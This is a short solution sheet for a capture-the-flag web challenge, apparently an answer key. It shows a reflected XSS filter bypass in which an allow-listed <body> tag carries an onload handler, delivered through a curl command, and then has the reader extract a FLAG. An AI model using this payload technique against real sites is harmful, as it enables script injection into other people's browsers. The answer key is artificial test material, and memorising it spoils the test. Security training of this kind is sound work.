# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Reflected XSS via an allow-listed `<body>` tag. Only `<body>` is
permitted, but `<body onload=...>` executes. A headless browser renders the page
and returns the flag only if `alert('XSS')` fires.

1. **Submit a `<body onload>` payload:**

   ```
   curl -s -G "http://<target>/page" --data-urlencode "name=<body onload=alert('XSS')>"
   ```

2. **Extract the flag** (`FLAG{...}`) from the response once the check passes, and
   report it verbatim.
